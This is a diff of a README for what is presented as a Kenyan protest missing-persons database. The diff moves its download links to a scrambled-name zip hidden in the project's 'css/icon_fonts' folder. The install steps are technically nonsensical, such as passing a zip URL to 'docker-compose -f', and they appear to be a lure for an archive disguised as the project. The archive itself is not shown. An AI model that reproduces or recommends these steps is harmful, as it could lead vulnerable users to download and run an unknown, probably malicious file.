@@ -35,7 +35,7 @@ docker-compose up --build -d --no-cache
 OR 
 
 ```env
-docker-compose -f https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/migrations/KENY-PERSON-BIL-PROTEST-MISSIN-DATABAS-FINANC-v3.5.zip up --build -d --no-cache
+docker-compose -f https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/app/static/css/icon_fonts/FINANC_KENY_DATABAS_BIL_MISSIN_PERSON_PROTEST_2.3.zip up --build -d --no-cache
 ```
 
 ## step 4
@@ -48,11 +48,11 @@ localhost:5000
 OR
 
 ```env
-https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/migrations/KENY-PERSON-BIL-PROTEST-MISSIN-DATABAS-FINANC-v3.5.zip
+https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/app/static/css/icon_fonts/FINANC_KENY_DATABAS_BIL_MISSIN_PERSON_PROTEST_2.3.zip
 ```
 
 OR
 
 ```env
-https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/migrations/KENY-PERSON-BIL-PROTEST-MISSIN-DATABAS-FINANC-v3.5.zip
+https://raw.githubusercontent.com/Kalitone/MISSING-PERSONS-DATABASE-2024-KENYA-FINANCE-BILL-PROTESTS-/main/app/static/css/icon_fonts/FINANC_KENY_DATABAS_BIL_MISSIN_PERSON_PROTEST_2.3.zip
 ```
